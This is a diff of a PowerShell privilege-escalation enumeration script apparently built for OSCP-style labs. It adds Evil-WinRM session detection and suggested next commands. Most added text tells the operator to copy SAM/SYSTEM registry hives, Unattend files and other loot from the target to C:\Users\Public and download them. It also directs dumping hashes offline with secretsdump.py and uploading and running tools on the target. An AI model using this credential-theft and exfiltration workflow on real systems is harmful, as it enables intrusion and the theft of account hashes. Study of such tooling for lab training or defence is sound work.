@@ -21,11 +21,12 @@ param(
 )
 
 $ErrorActionPreference = "SilentlyContinue"
-$Version = "1.9.8-en-ps"
+$Version = "1.9.9-en-ps"
 # English-first output: reliable under Evil-WinRM / EN-US consoles (Chinese often shows as ???).
 $script:DomainCtx = $null
 $script:AlreadySystem = $false
 $script:SkipWriteChecks = $false  # true when SYSTEM / high-integrity admin (write checks are meaningless noise)
+$script:IsEvilWinRM = $false      # WinRM remoting host (Evil-WinRM-style); gates download/upload Next text only
 # Priority: higher prints first within same severity (domain playbook > local noise)
 $Mode = if ($Full) { "full" } else { "summary" }
 if ($Quick) { $Mode = "summary" }
@@ -155,6 +156,9 @@ function Print-Summary {
     Section "Priority Findings"
     Write-Host "Privesc-only summary (OSCP first pass). Use -Full for raw dumps."
     Write-Host "English-only UI for WinRM/EN consoles. Manual verification only."
+    if ($script:IsEvilWinRM) {
+        Write-Host "[SESSION] Evil-WinRM-style (WinRM remoting): loot Next uses client download/upload verbs."
+    }
     if ($script:DomainCtx -and $script:DomainCtx.IsDomain) {
         Write-Host ("[DOMAIN] {0} | user={1} | DC={2}" -f $script:DomainCtx.Dns, $script:DomainCtx.User, $script:DomainCtx.IsDC)
         if ($script:High -eq 0) {
@@ -223,6 +227,113 @@ function Get-CurrentSids {
 }
 
 $script:MySids = Get-CurrentSids
+
+function Test-IsEvilWinRMSession {
+    <#
+    .SYNOPSIS
+      Detect WinRM remoting host used by Evil-WinRM (and Enter-PSSession).
+    .NOTES
+      Server cannot see the client binary name. Signals: PS Host.Name + parent wsmprovhost.exe.
+      When true, Next text may use Evil-WinRM client verbs (download/upload).
+    #>
+    try {
+        if ($Host -and $Host.Name -eq 'ServerRemoteHost') { return $true }
+    } catch {}
+    try {
+        if ($PSSenderInfo) { return $true }
+    } catch {}
+    $parentName = $null
+    try {
+        $cur = Get-CimInstance -ClassName Win32_Process -Filter "ProcessId=$PID" -ErrorAction Stop
+        if ($cur -and $cur.ParentProcessId) {
+            $par = Get-CimInstance -ClassName Win32_Process -Filter "ProcessId=$($cur.ParentProcessId)" -ErrorAction Stop
+            if ($par) { $parentName = [string]$par.Name }
+        }
+    } catch {
+        try {
+            $cur = Get-WmiObject -Class Win32_Process -Filter "ProcessId=$PID" -ErrorAction Stop
+            if ($cur -and $cur.ParentProcessId) {
+                $par = Get-WmiObject -Class Win32_Process -Filter "ProcessId=$($cur.ParentProcessId)" -ErrorAction Stop
+                if ($par) { $parentName = [string]$par.Name }
+            }
+        } catch {}
+    }
+    if ($parentName -and ($parentName -match '(?i)^wsmprovhost(\.exe)?$')) { return $true }
+    return $false
+}
+
+function Join-NextLines {
+    param([string[]]$Parts)
+    $lines = @()
+    foreach ($p in $Parts) {
+        if ($null -eq $p) { continue }
+        $t = [string]$p
+        if ($t.Trim().Length -eq 0) { continue }
+        $lines += $t
+    }
+    return ($lines -join "`n")
+}
+
+function Get-EvilWinRMLootNext {
+    param(
+        [string]$LocalPath = "",
+        [ValidateSet("hive","pair","system","admin","generic")][string]$Kind = "generic"
+    )
+    if (-not $script:IsEvilWinRM) { return "" }
+    $stage = "C:\Users\Public"
+    $leaf = if ($LocalPath) { Split-Path -Leaf $LocalPath } else { "FILE" }
+    switch ($Kind) {
+        "hive" {
+            return @(
+                "# Evil-WinRM loot (only when this session is WinRM remoting):",
+                "copy /y `"$LocalPath`" $stage\",
+                "# if denied: copy /y `"$LocalPath`" `$env:TEMP\",
+                "download $stage\$leaf",
+                "# Offline on attack host: secretsdump.py -sam SAM -system SYSTEM LOCAL"
+            ) -join "`n"
+        }
+        "pair" {
+            return @(
+                "# Evil-WinRM: stage both hives then download from client:",
+                "copy /y C:\Windows.old\Windows\System32\config\SAM $stage\",
+                "copy /y C:\Windows.old\Windows\System32\config\SYSTEM $stage\",
+                "download $stage\SAM",
+                "download $stage\SYSTEM",
+                "# Prefer same tree for both files; then secretsdump.py -sam SAM -system SYSTEM LOCAL"
+            ) -join "`n"
+        }
+        "system" {
+            return @(
+                "# Evil-WinRM + already SYSTEM: local privesc done; stage loot then client download",
+                "whoami",
+                "hostname",
+                "# proof: type proof.txt / local.txt as required by lab",
+                "# Prefer Windows.old SAM+SYSTEM if present (see other HIGH):",
+                "dir C:\Windows.old\Windows\System32\config",
+                "copy /y C:\Windows.old\Windows\System32\config\SAM $stage\",
+                "copy /y C:\Windows.old\Windows\System32\config\SYSTEM $stage\",
+                "download $stage\SAM",
+                "download $stage\SYSTEM",
+                "# Optional tool: upload tool.exe  then  .\tool.exe  (PATH often thin; use .\ name)",
+                "# Domain: crack/reuse offline; do not spray passwords from this shell"
+            ) -join "`n"
+        }
+        "admin" {
+            return @(
+                "# Evil-WinRM + elevated admin: loot/creds/domain next (not service ACL noise)",
+                "copy /y <loot> $stage\",
+                "download $stage\<loot>",
+                "# upload tool.exe ; .\tool.exe"
+            ) -join "`n"
+        }
+        default {
+            return @(
+                "# Evil-WinRM: copy loot to $stage\ then client: download $stage\<file>",
+                "# upload tool.exe ; run with .\tool.exe"
+            ) -join "`n"
+        }
+    }
+}
 
 function Test-AclWritable {
     param([string]$Path)
@@ -557,12 +668,19 @@ function Invoke-AllChecks {
         Write-Host "[*] Domain detected: DNS=$($script:DomainCtx.Dns) NetBIOS=$($script:DomainCtx.NetBios) DC=$($script:DomainCtx.IsDC)"
     }
 
+    $script:IsEvilWinRM = Test-IsEvilWinRMSession
+    if ($script:IsEvilWinRM) {
+        Write-Host "[*] WinRM remoting host detected (Evil-WinRM-style). Loot Next will use download/upload hints."
+    }
+
     Write-Host "[*] identity / groups / tokens ..."
     Test-IdentityAndTokens
 
     if ($script:AlreadySystem) {
         Write-Host "[*] Already SYSTEM - skipping write/ACL privesc checks (they only produce noise)."
-        Write-Host "[*] credentials / configs / domain loot still run ..."
+        Write-Host "[*] OS loot catalog / credentials / configs / domain still run ..."
+        # Still hunt Windows.old SAM/SYSTEM + Autologon; AIE is harmless noise if present
+        Test-ClassicMisconfigs
         Test-Credentials
         Test-AppConfigInventory
         Test-LocalPorts
@@ -617,9 +735,14 @@ function Test-IdentityAndTokens {
     if ($isSystem) {
         $script:AlreadySystem = $true
         $script:SkipWriteChecks = $true
+        $sysNext = if ($script:IsEvilWinRM) {
+            Get-EvilWinRMLootNext -Kind system
+        } else {
+            "whoami`nwhoami /priv`nwhoami /groups`nhostname`n# proof: type proof.txt / type local.txt as required by lab`n# If domain machine account context: consider domain pivot with care`n# Loot: Windows.old SAM+SYSTEM, Unattend, configs (see other findings)"
+        }
         Add-Finding HIGH "ALREADY NT AUTHORITY\SYSTEM - local privesc complete" `
             "Current token is SYSTEM (S-1-5-18). Do NOT hunt 'writable services/tasks' - as SYSTEM everything looks writable and is NOT a privesc lead. Collect proof/loot, then domain actions if needed." `
-            "whoami`nwhoami /priv`nwhoami /groups`nhostname`n# proof: type proof.txt / type local.txt as required by lab`n# If domain machine account context: consider domain pivot with care" `
+            $sysNext `
             "already_system" `
             -Priority 100
         [void]$script:Details.Add("whoami:`n$who`n`nprivs:`n$privText`ngroups:`n$grpText")
@@ -631,15 +754,24 @@ function Test-IdentityAndTokens {
     $inAdmins = $grpText -match 'S-1-5-32-544'
     if ($inAdmins -and $highIntegrity) {
         $script:SkipWriteChecks = $true
+        $adminNext = if ($script:IsEvilWinRM) {
+            Join-NextLines @("whoami /groups", "whoami /priv", (Get-EvilWinRMLootNext -Kind admin))
+        } else {
+            "whoami /groups`nwhoami /priv"
+        }
         Add-Finding HIGH "Already elevated local Administrator (High Integrity)" `
             "Full admin token. Skip service/task XML write hunting - ACL will show write on almost all system objects. Focus on loot/creds/domain." `
-            "whoami /groups`nwhoami /priv" `
+            $adminNext `
             "already_admin_high" `
             -Priority 100
     } elseif ($inAdmins) {
+        $filtNext = "whoami /groups`nwhoami /priv`nwhoami /all`nnet localgroup administrators`n# If filtered admin: need another path or UAC bypass (manual)"
+        if ($script:IsEvilWinRM) {
+            $filtNext = Join-NextLines @($filtNext, "# Evil-WinRM: Medium integrity is common; full admin may need another privesc path first")
+        }
         Add-Finding HIGH "User may be in local Administrators" `
             "If token is full admin, you may already have admin rights. Remote shells are often UAC-filtered (Medium integrity)." `
-            "whoami /groups`nwhoami /priv`nwhoami /all`nnet localgroup administrators`n# If filtered admin: need another path or UAC bypass (manual)" `
+            $filtNext `
             "admin_group" `
             -Priority 95
     }
@@ -884,9 +1016,16 @@ function Test-OsLootCatalog {
 
     foreach ($old in @("C:\Windows.old", "C:\windows.old")) {
         if (-not (Test-Path -LiteralPath $old)) { continue }
+        $oldNext = "dir `"$old`"`ndir `"$old\Windows\System32\config`"`ndir `"$old\Windows\System32`"`ndir `"$old\Users`"`ndir `"$old\Windows\Panther`""
+        if ($script:IsEvilWinRM) {
+            $oldNext = Join-NextLines @(
+                $oldNext,
+                "# Evil-WinRM: if SAM+SYSTEM exist under config\, copy to C:\Users\Public\ then download both"
+            )
+        }
         Add-Finding HIGH "OS leftover root present: $old" `
             "Upgrade/migration leftover. Systematically check old config hives (SAM/SYSTEM), Unattend, and old user profiles. High-value OSCP category." `
-            "dir `"$old`"`ndir `"$old\Windows\System32\config`"`ndir `"$old\Windows\System32`"`ndir `"$old\Users`"`ndir `"$old\Windows\Panther`"" `
+            $oldNext `
             "loot_oldroot:$old" `
             -Priority 98
         foreach ($w in @("$old\Windows", "$old\windows")) {
@@ -942,9 +1081,13 @@ function Test-OsLootCatalog {
         if ($seenU.ContainsKey($k)) { continue }
         $seenU[$k] = $true
         if (-not (Test-Path -LiteralPath $p)) { continue }
+        $uNext = "dir `"$p`"`nfindstr /ni /i `"password administrator username domain`" `"$p`""
+        if ($script:IsEvilWinRM) {
+            $uNext = Join-NextLines @($uNext, "copy /y `"$p`" C:\Users\Public\", "download C:\Users\Public\$(Split-Path -Leaf $p)")
+        }
         Add-Finding HIGH "Unattend/Sysprep found: $p" `
             "Install/sysprep leftovers often store local admin or domain passwords (current OS or Windows.old)." `
-            "dir `"$p`"`nfindstr /ni /i `"password administrator username domain`" `"$p`"" `
+            $uNext `
             "unattend:$p" -Priority 94
     }
 
@@ -968,9 +1111,14 @@ function Test-OsLootCatalog {
         if ($st.Ok) {
             if ($base -ieq 'SAM') { $haveSam = $true }
             if ($base -ieq 'SYSTEM') { $haveSystem = $true }
+            $hiveNext = if ($script:IsEvilWinRM) {
+                Get-EvilWinRMLootNext -LocalPath $p -Kind hive
+            } else {
+                "dir `"$p`"`nicacls `"$p`"`ncopy /y `"$p`" %TEMP%\`n# On attack host: secretsdump.py -sam SAM -system SYSTEM LOCAL"
+            }
             Add-Finding HIGH "Readable registry hive: $p (size=$($st.Len))" `
                 "Readable by current user. Offline hash extraction typically needs SAM + SYSTEM together (e.g. from Windows.old)." `
-                "dir `"$p`"`nicacls `"$p`"`ncopy /y `"$p`" %TEMP%\`n# On attack host: secretsdump.py -sam SAM -system SYSTEM LOCAL" `
+                $hiveNext `
                 "hive_read:$p" -Priority 97
         } else {
             if ($isLiveConfig) {
@@ -992,14 +1140,23 @@ function Test-OsLootCatalog {
     }
 
     if ($haveSam -and $haveSystem) {
+        $pairNext = if ($script:IsEvilWinRM) {
+            Get-EvilWinRMLootNext -Kind pair
+        } else {
+            "# Prefer copies from the same Windows tree (e.g. both under Windows.old)`n# secretsdump.py -sam SAM -system SYSTEM LOCAL"
+        }
         Add-Finding HIGH "Readable SAM + SYSTEM pair available" `
             "You have both hive types readable. Copy offline and extract local account hashes on the attack host." `
-            "# Prefer copies from the same Windows tree (e.g. both under Windows.old)`n# secretsdump.py -sam SAM -system SYSTEM LOCAL" `
+            $pairNext `
             "hive_pair_ready" -Priority 99
     } elseif ($haveSam -or $haveSystem) {
+        $partialNext = "dir C:\Windows.old\Windows\System32\config`ndir C:\windows.old\windows\System32"
+        if ($script:IsEvilWinRM) {
+            $partialNext = Join-NextLines @($partialNext, "# Evil-WinRM: after both files exist, copy to C:\Users\Public\ then download SAM + SYSTEM")
+        }
         Add-Finding MED "Partial hive set readable (need SAM + SYSTEM)" `
             "One of SAM/SYSTEM is readable. Hunt the sibling hive in the same folder tree (especially under Windows.old)." `
-            "dir C:\Windows.old\Windows\System32\config`ndir C:\windows.old\windows\System32" `
+            $partialNext `
             "hive_pair_partial" -Priority 90
     }
 
@@ -1824,6 +1981,9 @@ Write-Host "HIGH: $High  MED: $Med  INFO: $Info"
 if ($script:AlreadySystem) {
     Write-Host "Context: ALREADY SYSTEM - ignore any leftover write/ACL noise; local privesc is done."
     Write-Host "Recommended: proof/loot files, then domain actions if this is a domain machine."
+    if ($script:IsEvilWinRM) {
+        Write-Host "Evil-WinRM: stage under C:\Users\Public\ then client 'download'; tools via 'upload' + '.\tool.exe'."
+    }
 } elseif ($script:DomainCtx -and $script:DomainCtx.IsDomain) {
     Write-Host "Context: DOMAIN=$($script:DomainCtx.Dns)  DC=$($script:DomainCtx.IsDC)  User=$($script:DomainCtx.User)"
     if ($High -eq 0) {
@@ -1832,8 +1992,14 @@ if ($script:AlreadySystem) {
     } else {
         Write-Host "Recommended flow: local HIGH first -> then DOMAIN (SYSVOL/lateral)."
     }
+    if ($script:IsEvilWinRM) {
+        Write-Host "Evil-WinRM: for hive/file loot, copy to C:\Users\Public\ then client download (see HIGH Next)."
+    }
 } else {
     Write-Host "Flow: verify HIGH then MED; then WinPEAS/Seatbelt; CVE last."
+    if ($script:IsEvilWinRM) {
+        Write-Host "Evil-WinRM: stage loot under C:\Users\Public\ then client download."
+    }
 }
 Write-Host "No PowerShell? Use opassist-win-cn.bat or windows-cmd-checklist.txt"
 if ($Mode -ne "full") { Write-Host "Tip: re-run with -Full for raw dumps." }
